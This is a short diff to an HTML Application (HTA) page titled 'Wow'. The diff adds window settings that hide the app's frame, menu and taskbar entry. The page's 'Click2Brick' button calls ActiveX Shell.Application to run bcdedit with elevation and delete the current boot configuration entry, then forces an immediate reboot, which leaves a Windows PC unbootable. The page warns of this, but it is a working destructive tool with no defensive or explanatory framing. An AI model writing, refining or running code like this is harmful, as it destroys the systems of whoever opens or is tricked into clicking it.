@@ -1,4 +1,12 @@
 <title>Wow</title>
+<hta:application 
+  border='none' 
+  caption='no' 
+  showintaskbar='no' 
+  sysmenu='no' 
+  scroll='no' 
+  singleinstance='yes' 
+  windowstate='normal'>
 <p>PRESSING THE BUTTON BELOW WILL BREAK YOUR PC!</p>
 <p>CLICK THIS BUTTON TO DESTROY THE BOOT CONFIG DATA. THIS WILL DESTORY YOUR PC.</p>
 <button onclick="(function(){alert('Button clicked!');var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();})()">Click2Brick</button><p>Your PC</p>
